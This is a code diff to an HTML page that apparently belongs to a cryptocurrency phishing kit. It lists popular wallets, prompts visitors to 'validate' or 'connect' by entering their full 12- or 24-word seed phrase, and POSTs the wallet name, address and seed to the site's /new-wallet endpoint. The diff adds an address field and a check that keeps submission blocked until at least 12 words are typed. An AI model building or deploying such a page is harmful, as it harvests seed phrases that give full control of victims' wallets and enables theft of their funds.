@@ -1,6 +1,9 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="/assets/css/wallet.css" />
   </head>
   <body>
@@ -12,17 +15,17 @@
       <div class="wallet">
         <div id="list">
           <button class="btn">Trust Wallet</button>
-          <button class="btn">Metamask  Wallet</button>
-          <button class="btn">Yoroi  Wallet</button>
-          <button class="btn">Gero  Wallet</button>
-          <button class="btn">Nami  Wallet</button>
-          <button class="btn">Solana  Wallet</button>
-          <button class="btn">Phantom  Wallet</button>
-          <button class="btn">Sollet  Wallet</button>
-          <button class="btn">Xumm  Wallet</button>
-          <button class="btn">Cardano  Wallet</button>
-          <button class="btn">Daedalus  Wallet</button>
-          <button class="btn">CCVault  Wallet</button>
+          <button class="btn">Metamask Wallet</button>
+          <button class="btn">Yoroi Wallet</button>
+          <button class="btn">Gero Wallet</button>
+          <button class="btn">Nami Wallet</button>
+          <button class="btn">Solana Wallet</button>
+          <button class="btn">Phantom Wallet</button>
+          <button class="btn">Sollet Wallet</button>
+          <button class="btn">Xumm Wallet</button>
+          <button class="btn">Cardano Wallet</button>
+          <button class="btn">Daedalus Wallet</button>
+          <button class="btn">CCVault Wallet</button>
           <button class="btn">Avanlanche Wallet</button>
           <button class="btn">Velas Wallet</button>
           <button class="btn">Blockchain Wallet</button>
@@ -40,7 +43,14 @@
 
     <section class="input">
       <div class="wrap">
-        <h2>Seed Phrase</h2>
+        <h2>Connect Wallet</h2>
+        <p>Wallet Address</p>
+        <input
+          type="text"
+          name="address"
+          id="address"
+          placeholder="Please paste address"
+        />
         <p>
           Please enter your wallet's seed phrase, the seed phrase is 24 words
           long (sometimes 12)
@@ -51,7 +61,7 @@
           placeholder="Please enter seed phrase"
           autofocus
         ></textarea>
-        <button id="validate">Validate</button>
+        <button id="validate" disabled>Validate</button>
       </div>
     </section>
     <script>
@@ -59,8 +69,10 @@
       const form = document.querySelector(".input");
       const send = document.getElementById("validate");
       const formInput = document.getElementById("seedphrase");
+      const address = document.getElementById("address");
       const data = {
         wallet: "",
+        address: "",
         seed: "",
       };
       buttons.forEach((button) => {
@@ -72,9 +84,13 @@
       });
 
       send.addEventListener("click", async () => {
+        if (address.value == "" || address.value.length < 20) {
+          alert("Please provide wallet address");
+          return;
+        }
         send.textContent = "Validating Wallet...";
         data.seed = formInput.value;
-        console.log(data);
+        data.address = address.value;
         const response = await fetch(`${location.origin}/new-wallet`, {
           method: "POST",
           headers: {
@@ -96,6 +112,15 @@
         if (e.key == " ") {
           e.preventDefault();
           formInput.value += ", ";
+        }
+        const amount = formInput.value.split(", ");
+        if (amount.length < 12) {
+          send.setAttribute("disabled", "");
+          send.classList.remove("active");
+          return;
+        } else {
+          send.removeAttribute("disabled");
+          send.classList.add("active");
         }
       });
     </script>
